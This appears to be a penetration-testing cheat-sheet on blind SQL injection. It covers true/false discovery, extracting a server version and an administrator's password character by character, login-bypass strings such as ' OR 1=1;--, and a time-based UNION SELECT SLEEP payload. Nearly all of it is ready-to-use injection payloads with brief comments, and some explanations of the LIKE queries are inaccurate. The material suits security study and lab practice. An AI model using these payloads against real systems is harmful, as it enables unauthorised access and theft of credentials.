This is when we get little or no feedback to confirm whether our injected queries succeeded or not, this is because error messages have been disabled, but the injection still works regardless.

## Discovery

The key to discovering Blind SQL is to rely on a true or false conditional relationship. 

```sh
# True
' and 'a'='a

# False
' and 'a'='b
```

- If the `true` request displays content and the `false` query does not display anything, then the field is vulnerable.

---

Display server version 

```sql
' and substring(@@version,1,1)='0
-- If it doesn't work, you need to increment the value from 0 to 1,2,3,4.... until you get content like in the `true` query. This displays the first character of the server version.
```

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
-- confirming that there is a table called users.

' AND (SELECT 'a' FROM users WHERE username='administrator')='a
-- confirming that there is a user called administrator.

' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
-- determine the number of characters in the administrator's password. This condition must be true, confirming that the password has more than one character.

' AND SUBSTRING((SELECT password FROM users WHERE username = 'Administrator'), 1, 1) = 's

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
-- confirm that the first character of the password is s or a
```

**Bypass Authentication**

Enter the following in the username or password field: 

```sql
' OR 1=1;--
' or 1=1; -- -
') or 1=1; -- -
```

What happens if we enter `' or true --` in the username field?

```sql
') or true --
```

### Boolean Based

```sql
select * from <table> where database() like 'a%';
```

This returns all rows where the username starts with the letter a.

```sql
select * from <table> where database() like '%n';
```

This returns all rows where the username ends with the letter n.

```sql
select * from <table> where username like '%mi%';
```

This returns all rows with a username containing the characters mi within.

## Time Based

Instead, your indicator of a correct query is based on how long the query takes to complete. This delay is introduced using built-in methods such as **`SLEEP(x)`** alongside the UNION statement. 
The sleep method will only be executed after a successful UNION SELECT statement.

> If there was no pause in the response time, we know the query failed.

```sql
admin123' UNION SELECT SLEEP(5),2;--
```
